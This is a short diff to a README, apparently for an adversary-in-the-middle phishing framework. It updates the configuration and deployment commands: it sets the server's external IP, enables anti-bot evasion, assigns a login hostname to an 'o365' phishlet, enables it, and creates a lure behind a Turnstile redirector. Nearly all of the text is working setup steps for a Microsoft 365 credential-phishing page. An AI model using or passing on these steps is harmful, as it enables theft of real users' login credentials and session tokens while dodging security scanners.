@@ -64,12 +64,13 @@ For comprehensive instructions on installation, detailed configuration, enterpri
 3.  **Configure**:
     ```bash
     domains set yourdomain.com
-    config ipv4 your.vps.ip
+    config ipv4 external your.vps.ip
     antibot enabled true
     ```
 
 4.  **Deploy**:
     ```bash
+    phishlets hostname o365 login.yourdomain.com
     phishlets enable o365
     lures create o365
     lures edit 0 redirector o365_turnstile
